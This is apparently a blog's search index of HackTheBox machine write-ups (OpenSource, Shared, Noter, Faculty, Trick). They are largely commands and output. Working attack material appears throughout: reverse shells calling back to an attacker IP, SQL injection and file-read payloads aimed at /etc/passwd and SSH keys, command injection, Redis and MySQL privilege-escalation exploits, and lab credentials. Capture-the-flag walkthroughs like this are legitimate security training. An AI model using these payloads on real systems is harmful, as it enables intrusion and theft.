b/app/.vscode/settings.json\tnew file mode 100644\tindex 0000000..5975e3f\t--- /dev/null\t+++ b/app/.vscode/settings.json\t@@ -0,0 +1,5 @@\t+{\t+ \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",\t+ \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",\t+ \"http.proxyStrictSSL\": false\t+}\tdiff --git a/app/app/views.py b/app/app/views.pyWe can see a pair of credentials: dev01:Soulless_Developer#2022. But they are not use for SSH. This commit change the views.py file, if we checked it:import osfrom app.utils import get_file_namefrom flask import render_template, request, send_filefrom app import app@app.route('/', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html')@app.route('/uploads/&lt;path:path&gt;')def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))We see that is using flask and templates. As well as some path, like uploads.FootholdWe can try to manipulate the upload function and overwriting the views.py file. Go http://10.10.11.164/upcloud and upload a file, but intercept the request with burp. We can see that the web is uploading the file as:We can change this into our reverse shell, using the following content:@app.route('/shell')def cmd(): return os.system(request.args.get('cmd'))This should be the final output:Send it with the forward button from burp.We can start now a reverse shell:zero@pio$ netcat -lvnp 443zero@pio$ curl 'http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202&gt;%261|nc%2010.10.16.44%20443%20&gt;/tmp/f'And now, we should have our reverse shell stablished. We can see that we are directly root:/app # whoami\trootA bit strange, no? Testing the network, we can see that we are not in the main machine./app # ifconfig\teth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:06 \t inet addr:172.17.0.6 Bcast:172.17.255.255 Mask:255.255.0.0\t UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\t RX packets:861 errors:0 dropped:0 overruns:0 frame:0\t TX packets:747 errors:0 dropped:0 overruns:0 carrier:0\t collisions:0 txqueuelen:0 \t RX bytes:83162 (81.2 KiB) TX bytes:1068984 (1.0 MiB)\t\tlo Link encap:Local Loopback \t inet addr:127.0.0.1 Mask:255.0.0.0\t UP LOOPBACK RUNNING MTU:65536 Metric:1\t RX packets:0 errors:0 dropped:0 overruns:0 frame:0\t TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\t collisions:0 txqueuelen:1000 \t RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)We must found a way to scape from this container to our machine. We can notice that from here we have access to the filtered port 3000./app # nc -nv 10.10.11.164 3000\t10.10.11.164 (10.10.11.164:3000) openWe can try forward the port to our machine with chisel. Download the binary into the container. First use the upload function we have in the web to upload the binary. We can see that the path it is saved is http://10.10.11.164/uploads/chisel . If we try downloading from the container we will get an error:/root # wget http://10.10.11.164/uploads/chisel\tConnecting to 10.10.11.164 (10.10.11.164:80)\twget: server returned error: HTTP/1.1 500 INTERNAL SERVER ERRORBut if we download it from the localhost:/root # wget http://127.0.0.1/uploads/chisel\tConnecting to 127.0.0.1 (127.0.0.1:80)\tsaving to 'chisel'\tchisel 100% |********************************| 8544k 0:00:00 ETA\t'chisel' savedThis is because the container doesn’t have a direct connection to the target or our machine.We can use chisel on our machine:zero@pio$ sudo chisel server --port 3000 -v --reverse --socks5And on the container:/app # ./chisel client 10.10.16.44:3000 R:5000:socksNow we can access it on localhost:5000. We can see that is a git repository, with the previous founded credentials we can get an RSA.Privilege EscalationExecuting pspy we can see that it is commiting backups automatically:2022/08/29 22:54:01 CMD: UID=0 PID=23023 | git commit -m Backup for 2022-08-29 2022/08/29 22:54:01 CMD: UID=0 PID=23025 | /bin/sh .git/hooks/pre-commit 2022/08/29 22:54:01 CMD: UID=0 PID=23026 | git push origin main 2022/08/29 22:54:01 CMD: UID=0 PID=23032 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.gitIn GTFObins we can get some info about the pre-commit. Taking the example for there, let’s try modifying the bash permissions and executing it by ourselves:-bash-4.4$ echo \"chmod u+s /bin/bash\" &gt;&gt; ~/.git/hooks/pre-commit-bash-4.4$ chmod +x !$chmod +x ~/.git/hooks/pre-commitbash-4.4# whoami\troot" }, { "title": "HTB | Shared", "url": "/pentesting/htb/machines/shared", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, medium, machines", "date": "2022-08-29 00:00:00 +0200", "snippet": "FingerprintingWe can know that the server only has a web server:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)80/tcp open http nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to http://shared.htb443/tcp open ssl/http nginx 1.18.0| tls-nextprotoneg: | h2|_ http/1.1|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0| tls-alpn: | h2|_ http/1.1|_http-title: Did not follow redirect to https://shared.htb| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US| Not valid before: 2022-03-20T13:37:14|_Not valid after: 2042-03-15T13:37:14Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can try navigating to shared.htb and see that is a store with a cart. Adding things to the cart and going to pay will redirect us to checkout.shared.htb. In that page we can see two strange cookies.FootholdWe can try some tools like sqlmap to try testing on it, without success:zero@pio$ sqlmap -r req --level=2 --cookie='PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200f709dbd7fa8dc3ee67a4c5b7d63d4171dd53915d28de292a88baee830cc319456886303b611bd1811fbf6bd46be2b6f287e4af10a7b9971c6418432b175b474f620008d4c033ec730e16f0247135eb6c87e9a7522ef50ff14bf3820ee0951237efeb26466e8b589bc52712001991422cba6a3214acd11bd313e5c7529a8d61a006b79a96952bc183034849ad445a7853728792606a4a0c7a5f3033c341767ca9e49f5edab0a265cd60792399520c15cc52260d65927084f3129919780e164d09108745db41d514bcea071862419cc0efb41b4330adeae10d07bc8f5ca3883e947347c9a19a5a0c3818d58eca1166164250a5dd25b2ef131562828e9a5e87ba02f906b61fe501d306bc02a402ee7ce682d7f24bf6a03aae; custom_cart=*' -p 'custom_cart' --batchManually we can try some common SQL injections. Trying different payloads, until {\"' and 0=1 union select 1,2,3-- -\":\"1\"} works. We can see that we can visualize the 1 and 2 colum. We can start with a SQL Union based.Using the @@version as {\"' and 0=1 union select 1,@@version,3-- -\":\"1\"} show that the version is 10.5.15-MariaDB-0+deb11u1.We can get the database name with {\"' and 0=1 union select 1,database(),3-- -\":\"1\"} :We can get the table name with {\"' and 0=1 union select 1,TABLE_NAME,3 from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -\":\"1\"}:We can try guessing some commons fields from a user database, like the name or the password with {\"' and 0=1 union select 1,username,2 from checkout.user-- -\":\"1\"} and {\"' and 0=1 union select 1,password,2 from checkout.user-- -\":\"1\"}:We can see some kind of md5 password. We can try breaking it with hashcat:zero@pio$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt...fc895d4eddc2fc12f995e18c865cf273:Soleil101 Session..........: hashcatStatus...........: CrackedLet’s try using it to get an SSH connection:zero@pio$ ssh james_mason@10.10.11.172...james_mason@shared:~$Privilege EscalationWe can found that our user is part of a developer group:james_mason@shared:~$ id\tuid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)Let’s see what files does this user has:james_mason@shared:~$ find / -group developer 2&gt;/dev/null\t/opt/scripts_reviewjames_mason@shared:~$ cd /opt/scripts_reviewjames_mason@shared:/opt/scripts_review$ lsjames_mason@shared:/opt/scripts_review$We don’t have any files, but have write permissions. Using pspy we can see that the UID 1001 is using ipython:2022/08/29 06:00:01 CMD: UID=1001 PID=29966 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython 2022/08/29 06:00:01 CMD: UID=1001 PID=29967 | /usr/bin/pkill ipython 2022/08/29 06:00:01 CMD: UID=1001 PID=29968 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipythonWe can search for vulnerabilities, finding this Github post, that gives us a PoC. We can try to replicate it, but changing the command:james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_defaultjames_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startupjames_mason@shared:/opt/scripts_review$ echo \"import os; os.system('cat ~/.ssh/id_rsa &gt; /dev/shm/key')\" &gt; profile_default/startup/foo.pyWe will get a RSA in the /dev/shm/key {: .filepath}. After using it, we will be dan_smith, not root yet.Using the same steps we can see that this user is part of a sysadmin group:dan_smith@shared:~$ id\tuid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)dan_smith@shared:~$ find / -group sysadmin 2&gt;/dev/null\t/usr/local/bin/redis_connector_devExecuting redis we will get:dan_smith@shared:~$ /usr/local/bin/redis_connector_dev\t[+] Logging to redis instance using password...\t\tINFO command result:\t# Server\tredis_version:6.0.15\tredis_git_sha1:00000000\tredis_git_dirty:0\tredis_build_id:4610f4c3acf7fb25\tredis_mode:standalone\tos:Linux 5.10.0-16-amd64 x86_64\tarch_bits:64\tmultiplexing_api:epoll\tatomicvar_api:atomic-builtin\tgcc_version:10.2.1\tprocess_id:29830\trun_id:fa1fe4f300db414bab5300041632304ba2486ee6\ttcp_port:6379\tuptime_in_seconds:1525\tuptime_in_days:0\thz:10\tconfigured_hz:10\tlru_clock:823628\texecutable:/usr/bin/redis-server\tconfig_file:/etc/redis/redis.conf\tio_threads_active:0\t &lt;nil&gt;We can see that redis is passing a password that we can’t see. Using redis-cli we can see the port is using:dan_smith@shared:~$ redis-cli127.0.0.1:6379&gt;We can get the file in our machine and use netcat to see what we get:dan_smith@shared:/usr/local/bin$ python3 -m http.server 8000zero@pio$ wget http://10.10.11.172:8000/redis_connector_devzero@pio$ chmod +x redis_connector_devzero@pio$ nc -lvnp 6379zero@pio$ ./redis_connector_devIn the netcat we will a cleartext password: F2WHqJUz2WEz=Gqq . Now we can exploit this vulnerability with the password. Back in the target machine, execute redis-cli with the password:dan_smith@shared:/usr/local/bin$ redis-cli --pass \"F2WHqJUz2WEz=Gqq\"With this vulnerability we can execute a reverse shell:**dan_smith@shared:~$ echo \"bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1\" &gt; shell**And now execute the vulnerability:127.0.0.1:6379&gt; eval 'local l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = l(); local f = io.popen(\"cat /home/dan_smith/shell | bash\"); local res = f:read(\"*a\"); f:close(); return res' 0In a netcat in our machine should recieve the connection:zero@pio$ nc -lvnp 443...root@shared:/tmp#" }, { "title": "HTB | Noter", "url": "/pentesting/htb/machines/noter", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, medium, machines", "date": "2022-08-29 00:00:00 +0200", "snippet": "FingerprintingThe nmap gives us:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: NoterService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelIf we created and account we can see a cookie after login.FootprintingThe anonymous user for FTP doesn’t work.We can check the cookie we have: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiemVybyJ9.Ywyj5A.uzkuRLWLxKI9ty3BHCUOWVr9Szo . We can use flask-unsign, from Python, to decrypt the cookie.zero@pio$ flask-unsign --unsign --no-literal-eval --wordlist /usr/share/wordlists/rockyou.txt --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiemVybyJ9.Ywyj5A.uzkuRLWLxKI9ty3BHCUOWVr9Szo'[*] Session decodes to: {'logged_in': True, 'username': 'zero'}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 17024 attemptsb'secret123'We must use —unsign to specify that we are using a wordlist, and --no-literal-eval to allow the cookie as a string (if not we get an error). We can see that the output differs from a invalid password than an invalid username, so we can try to get a list of valid users. Let’s use hydra for this:zero@pio$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'test' 10.10.11.160 -s 5000 http-post-form '/login:username=^USER^&amp;password=test:S=&lt;div class=\"alert alert-danger\"&gt;Invalid login&lt;/div&gt;'[5000][http-post-form] host: 10.10.11.160 login: blue password: testNow we can use flask-unsign to generate the cookie, using the same format as our cookie:zero@pio$ flask-unsign --sign --secret 'secret123' --cookie \"{'logged_in': True, 'username': 'blue'}\"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YwypQA.7rj51Sgyf-usb-tvmGo4CKREIkkAnd now we are in the blue user account:Inside the premium notes, we can see the credentials blue:blue@Noter! . We can test the credentials works:zero@pio$ tp blue@10.10.11.160 Connected to 10.10.11.160.220 (vsFTPd 3.0.3)331 Please specify the password.Password: 230 Login successful.We can get a pdf with the password policy. There we can see that the default password is username@site_name!. In the note we can saw that is signed by the ftp_admin user, if we try the default password (ftp_admin@Noter!):zero@pio$ ftp ftp_admin@10.10.11.160Inside we can see two zip files. Inside of them are the source code of the web. In one of them can be found the following lines:# Config MySQLapp.config['MYSQL_HOST'] = 'localhost'app.config['MYSQL_USER'] = 'DB_user'app.config['MYSQL_PASSWORD'] = 'DB_password'app.config['MYSQL_DB'] = 'app'app.config['MYSQL_CURSORCLASS'] = 'DictCursor'As well as the secret:if __name__ == '__main__': app.secret_key='secret123' app.run(host=\"0.0.0.0\",debug=False)In the other, we have a non-default credentials:# Config MySQLapp.config['MYSQL_HOST'] = 'localhost'app.config['MYSQL_USER'] = 'root'app.config['MYSQL_PASSWORD'] = 'Nildogg36'app.config['MYSQL_DB'] = 'app'app.config['MYSQL_CURSORCLASS'] = 'DictCursor'We cannot use the credentials for SSH. Also, the machine doesn’t have an opened port of MySQL so we cannot connect to it.Going back to the web, we can see we can export notes from an URL to the server. In the source code, the app access this through a get. We will create a shell.md file with the content --';bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1;'— . Open a netcat, and launch the file. Now we are inside the system.Privilege EscalationWe can see is vulnerable to CVE-2021-3560, but using this PoC we see that the machine doesn’t have Gnome-Control-Center, necessary for the exploit.We can try another path. The MySQL version is also vulnerable. Using this exploit we can make it work. Download the exploit into the machine and follow the exploit. First, compile it:svc@noter:~$ gcc -g -c 1518.csvc@noter:~$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lcFollowing the instructions (we must change the path we upload the script from the exploitdb):svc@noter:~$ mysql -u'root' -p'Nildogg36'MariaDB [(none)]&gt; use mysql;MariaDB [mysql]&gt; create table foo(line blob);MariaDB [mysql]&gt; insert into foo values(load_file('/home/svc/1518.so'));MariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/1518.so';MariaDB [mysql]&gt; create function do_system returns integer soname '1518.so';MariaDB [mysql]&gt; select * from mysql.func;MariaDB [mysql]&gt; select do_system('chmod u+s /bin/bash');MariaDB [mysql]&gt; exitIf everything works:svc@noter:~$ bash -pbash-5.0# whoami\troot" }, { "title": "HTB | Faculty", "url": "/pentesting/htb/machines/faculty", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, medium, machines", "date": "2022-08-29 00:00:00 +0200", "snippet": "FingerprintThe nmap show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)| 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)|_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://faculty.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe web redirect us to /login.php, asking for a ID. Testing some IDs (1,2,3…) we didn’t find anything. Trying to intercept the request with burp we see in the request a new page:POST /admin/ajax.php?action=login_faculty HTTP/1.1FootholdWe see in that a page a login, easily bypassed with ' or '1'='1' #.We can download some of the pages as a pdf. Doing so will show us a new directory in the URL:We can search by mpdf, finding a vulnerabilty here. We can intercept the Burp request when creating a payload. We can see that it is url encoded two times and then base64 encode. We can use the same PoC as the vulnerability:&lt;annotation file=\"/etc/passwd\" content=\"/etc/passwd\" icon=\"Graph\" title=\"Attached File: /etc/passwd\" pos-x=\"195\" /&gt;And encoded it as the same way:JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNFIn the attachment part of the pdf we can find the passwd file. We can see there two users with shell (apart from the root):gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bashdeveloper:x:1001:1002:,,,:/home/developer:/bin/bashTrying to get the RSA of the users as:&lt;annotation file=\"/home/developer/.ssh/id_rsa\" content=\"/home/developer/.ssh/id_rsa\" icon=\"Graph\" title=\"Attached File: /home/developer/.ssh/id_rsa\" pos-x=\"195\" /&gt;Lead to an error generating the pdf.Moving to the first page, we can see now some IDs. Loging with them redirect us to the schedule of each user. But while in the url we are in faculty.htb/index.php, Burp get the sites as a request to /admin/ajax.php?action=get_schecdule . If we go to that page without being loging, we can see an error.We can get this file with:&lt;annotation file=\" /var/www/scheduling/admin/admin_class.php\" content=\" /var/www/scheduling/admin/admin_class.php\" icon=\"Graph\" title=\"Attached File: /var/www/scheduling/admin/admin_class.php\" pos-x=\"195\" /&gt;Encoded as:JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBjb250ZW50PSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBpY29uPSUyNTIyR3JhcGglMjUyMiUyNTIwdGl0bGU9JTI1MjJBdHRhY2hlZCUyNTIwRmlsZTolMjUyMCUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNFIn this file we can see an include to db_connect.php. let’s get it:&lt;annotation file=\" /var/www/scheduling/admin/db_connect.php\" content=\" /var/www/scheduling/admin/db_connect.php\" icon=\"Graph\" title=\"Attached File: /var/www/scheduling/admin/db_connect.php\" pos-x=\"195\" /&gt;Encoded as:JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGNvbnRlbnQ9JTI1MjIlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNFThere we can see some credentials, but we don’t have the user.&lt;?php $conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die(\"Could not connect to mysql\".mysqli_error($con));We can try using them with SSH and the other two users we have. With gbyolo the credentials are valid.Privilege EscalationWe can use sudo with this user. Thanks to that we can see that we can run a command as developer:gbyolo@faculty:~$ sudo -l[sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser gbyolo may run the following commands on faculty: (developer) /usr/local/bin/meta-gitThis report in HackerOne told us about a vulnerability in meta-git, we can try doing it:gbyolo@faculty:~$ sudo -u developer meta-git clone 'poc | whoami'\tmeta git cloning into 'poc | whoami' at poc | whoami\t\tpoc | whoami:\tpoc | whoami: command 'git clone poc | whoami poc | whoami' exited with error: Error: spawnSync /bin/sh EACCESAt first we got an error. That’s why developer doesn’t have access to our home. Let’s do it from a path that both accounts can get:gbyolo@faculty:/$ sudo -u developer meta-git clone 'test | whoami'\tmeta git cloning into 'test | whoami' at test | whoami\t\ttest | whoami:\tdeveloper\tfatal: repository 'test' does not exist\twhoami: extra operand ‘test’\tTry 'whoami --help' for more information.\ttest | whoami ✓So we can execute code as developer. Trying a reverse shell result in failure:gbyolo@faculty:/$ sudo -u developer meta-git clone 'test | nc -e sh 10.10.16.44 443'Let’s try getting the RSA:gbyolo@faculty:/$ sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'And we got it. We can now connect as developer, but where are not root yet. Using linpeas we can see some attacks paths. We see that we have access to gdb. We can make gdb take a root process and then make it execute a shell.Search a process the root is using with a shell, for example Python:developer@faculty:~$ ps faux | grep ^root | grep python3Then attach gdb to that process:developer@faculty:~$ gdb -p 3154(gdb) call (void)system(\"chmod u+s /bin/bash\")[Detaching after vfork from child process 27552](gdb) quitNow execute the shell:developer@faculty:~$ bash -pbash-5.0# whoamiroot" }, { "title": "HTB | Trick", "url": "/pentesting/htb/machines/trick", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-08-28 00:00:00 +0200", "snippet": "EnumerationAfter the nmap we found a web and a SMTP server:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)|_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open http nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernelSMTP - Port 25Going back to the SMTP server, we can connect with telnet as:zero@pio$ telnet 10.10.11.166 25We succesfully connect. We can try if we can enumerate users with the VRFY command (same with HELO):220 debian.localdomain ESMTP Postfix (Debian/GNU)252 2.0.0 rootVRFY aaaaaaaa550 5.1.1 &lt;aaaaaaaa&gt;: Recipient address rejected: User unknown in local recipient tableWe try with a possible valid user and see that is valid. Sometimes all the response seems to be valid, so we try with a non-existing user and see that it got rejected. We can use now smtp-user-enum with the Seclists to get some valid users:zero@pio$ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.11.166 -w 15After executing the command we got 0 valid users, even though we know that the user root is a valid one. We add a timeout of 15 seconds with -w 15 and get now two valid users with this wordlist:10.10.11.166: root exists10.10.11.166: mysql existsLet’s try if the domain from the nmap is a valid one in the telnet:VRFY root@debian.localdomain252 2.0.0 root@debian.localdomainVRFY root@asdasd.asdas454 4.7.1 &lt;root@asdasd.asdas&gt;: Relay access deniedSo we know that this is the syntax of the emails.We can try to authenticate, getting errors with IMAP and POP3 authentication:1 LOGIN root root502 5.5.2 Error: command not recognizedUSER root502 5.5.2 Error: command not recognizedIf we can try to hydra we confirm that we cannot authenticate here:zero@pio$ hydra -L valid_users -P /usr/share/wordlists/rockyou.txt -f 10.10.11.166...[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 5.5.1 Error: authentication not enabledDNS - Port 53We would try some dig with the information aviable from the nmap, without success:zero@pio$ dig A debian.localdomain @10.10.11.166zero@pio$ dig axfr debian.localdomain @10.10.11.166zero@pio$ dig axfr 10.10.11.166 @10.10.11.166But if we use the domain trick.htb:dig axfr trick.htb @10.10.11.166; &lt;&lt;&gt;&gt; DiG 9.18.4-2-Debian &lt;&lt;&gt;&gt; axfr trick.htb @10.10.11.166;; global options: +cmdtrick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800trick.htb. 604800 IN NS trick.htb.trick.htb. 604800 IN A 127.0.0.1trick.htb. 604800 IN AAAA ::1preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800;; Query time: 196 msec;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP);; WHEN: Sun Aug 28 11:14:05 BST 2022;; XFR size: 6 records (messages 1, bytes 231)We found the subdomain prepod-payroll. Let’s add it to the hosts file. We have here a login.We cannot enumerate users there, providing bad credentials give an Username or password is incorrect error.We can try finding more subdomains fuzzing. Tools like dnsrecon doesn’t find anything. We can try with wfuzz to fuzz in the headers. This as well doesn’t provide anything. We can try using the same syntax as the founded subdomain:zero@pio$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' --hh 5480000000254: 200 178 L 631 W 9660 Ch \"marketing\"We found a new subdomain, and here a new web:If we move between pages we found that the URL is as: http://preprod-marketing.trick.htb/index.php?page=about.html .Nginx - Port 80The web ask for a valid email (just the format). Inspecting the source code we couldn’t find any link to another web. We also found a domain, debian.localdomain, but adding it to the /etc/hosts {: .filepath} doesn’t provide any new web.We can found in the source code a path to the background mp4. If we go one step back in /assets/mp4/ {: .filepath} we got a 403 error.FootholdIn the preprod-marketing subdomain we can use the dotdotpwn to test for path traversal:zero@pio$ dotdotpwn -m http-url -u http://preprod-marketing.trick.htb/index.php?page=TRAVERSAL -M GET -k rootUsing the following payload ..././..././..././etc/passwd we can read the file. Searching for users we found the michael user with a shell. Let’s try finding it a RSA with ..././..././..././home/michael/.ssh/id_rsa . And we got it. Connect now to the machine with it.Call the web with a curl to get the RSA in a good format and connect to it:zero@pio$ curl 'http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa'Privilege EscalationAfter getting the shell we can check the kernel version:-bash-5.0$ uname -aLinux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/We see that is a vulnerable version, the CVE-2021-4043, pwnkit. If we check our sudo permission we can see that we can restart the fail2ban service:-bash-5.0$ sudo -lMatching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restartWe will go to the path of the program, in /etc/fail2ban/action.d/ {: .filepath}. We can’t write the config file, but we can remove it and create a new one with the following commands:-bash-5.0$ sed \"s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/chmod u+s \\/bin\\/bash/g\" /etc/fail2ban/action.d/iptables-multiport.conf &gt; config.conf-bash-5.0$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf-bash-5.0$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf-bash-5.0$ sudo /etc/init.d/fail2ban restartStart a bruteforcing to the ssh to get the fail2ban start:zero@pio$ hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txtAnd after a few seconds execute bash and we should be root:-bash-5.0$ bash -pbash-5.0# whoamiroot" }, { "title": "Support", "url": "/posts/Support/", "categories": "", "tags": "", "date": "2022-08-28 00:00:00 +0200", "snippet": "title: HTB | Support author: Zeropio date: 2022-08-28 categories: [Pentesting, HackTheBox] tags: [htb, windows, easy, machines] permalink: /pentesting/htb/machines/support image: path: /assets/img/hackthebox/card/Support.png width: 800 height: 500—FootprintingThe nmap provides us with:PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows 